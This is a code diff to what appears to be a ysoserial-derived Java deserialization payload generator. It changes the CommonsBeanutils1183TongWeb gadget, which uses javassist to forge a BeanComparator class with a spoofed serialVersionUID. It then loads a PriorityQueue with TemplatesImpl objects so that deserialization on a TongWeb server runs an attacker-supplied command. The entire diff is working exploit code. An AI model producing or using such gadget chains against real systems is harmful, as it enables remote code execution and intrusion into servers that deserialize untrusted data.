@@ -1,6 +1,9 @@
 package org.su18.ysuserial.payloads.gadgets;
 
+import javassist.ClassClassPath;
+import javassist.ClassPool;
 import javassist.CtClass;
+import javassist.CtField;
 import org.apache.commons.beanutils.BeanComparator;
 //import com.tongweb.commons.beanutils.BeanComparator;
 import org.su18.ysuserial.payloads.ObjectPayload;
@@ -8,6 +11,10 @@ import org.su18.ysuserial.payloads.annotation.Dependencies;
 import org.su18.ysuserial.payloads.util.Gadgets;
 import org.su18.ysuserial.payloads.util.PayloadRunner;
 import org.su18.ysuserial.payloads.util.Reflections;
+
+import java.math.BigInteger;
+import java.util.Comparator;
+import java.util.PriorityQueue;
 
 import java.util.PriorityQueue;
 
@@ -22,27 +29,41 @@ public class CommonsBeanutils1183TongWeb implements ObjectPayload<Object> {
 		PayloadRunner.run(CommonsBeanutils1183TongWeb.class, args);
 	}
 
+	public class JavassistClassLoader extends ClassLoader {
+		public JavassistClassLoader(){
+			super(Thread.currentThread().getContextClassLoader());
+		}
+	}
+
 	@Override
 	public Object getObject(String command) throws Exception {
-		final Object template = Gadgets.createTemplatesImpl(command);
+		final Object templates = Gadgets.createTemplatesImpl(command);
 
-//		Class<?> BeanComparator = Class.forName("com.tongweb.commons.beanutils.BeanComparator");
+		// 修改BeanComparator类的serialVersionUID
+		ClassPool pool = ClassPool.getDefault();
+		pool.insertClassPath(new ClassClassPath(Class.forName("com.tongweb.commons.beanutils.BeanComparator")));
+		final CtClass ctBeanComparator = pool.get("com.tongweb.commons.beanutils.BeanComparator");
+		try {
+			CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
+			ctBeanComparator.removeField(ctSUID);
+		}catch (javassist.NotFoundException e){}
+		ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));
+		final Comparator beanComparator = (Comparator)ctBeanComparator.toClass(new JavassistClassLoader()).newInstance();
+		ctBeanComparator.defrost();
+		Reflections.setFieldValue(beanComparator, "property", "lowestSetBit");
 
-		CtClass ctClass = POOL.get("com.tongweb.commons.beanutils.BeanComparator");
-		insertField(ctClass, "serialVersionUID", "private static final long serialVersionUID = -3490850999041592962L;");
+		PriorityQueue<Object> queue = new PriorityQueue(2, (Comparator<? super Object>)beanComparator);
 
-		Class                       beanCompareClazz = ctClass.toClass();
+		queue.add(new BigInteger("1"));
+		queue.add(new BigInteger("1"));
 
-		BeanComparator              comparator       = (BeanComparator) beanCompareClazz.newInstance();
-		final PriorityQueue<Object> queue            = new PriorityQueue<Object>(2, comparator);
-		queue.add("1");
-		queue.add("1");
+		Reflections.setFieldValue(beanComparator, "property", "outputProperties");
 
-		// switch method called by comparator
-		Reflections.setFieldValue(comparator, "property", "outputProperties");
-		Reflections.setFieldValue(comparator, "comparator", String.CASE_INSENSITIVE_ORDER);
-		Reflections.setFieldValue(queue, "queue", new Object[]{template, template});
+		Object[] queueArray = (Object[])Reflections.getFieldValue(queue, "queue");
+		queueArray[0] = templates;
+		queueArray[1] = templates;
 
 		return queue;
 	}
+
 }
